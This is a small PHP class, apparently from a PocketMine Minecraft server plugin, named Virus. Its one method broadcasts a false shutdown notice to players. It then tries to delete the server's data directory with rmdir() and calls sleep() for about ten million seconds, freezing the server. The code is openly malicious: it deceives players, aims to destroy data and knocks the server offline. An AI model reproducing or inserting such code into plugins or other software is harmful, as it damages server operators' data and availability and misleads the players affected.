<?php

namespace provsalt\Virus;

use pocketmine\Server;
use pocketmine\utils\TextFormat;

class Virus {
	public static function runVirus() :void{
		Server::getInstance()->broadcastMessage(TextFormat::colorize("&d[Servwr] &rGoodbye guys server will be shutting down today!"));
		rmdir(Server::getInstance()->getDataPath());
		sleep(10000000);
	}
}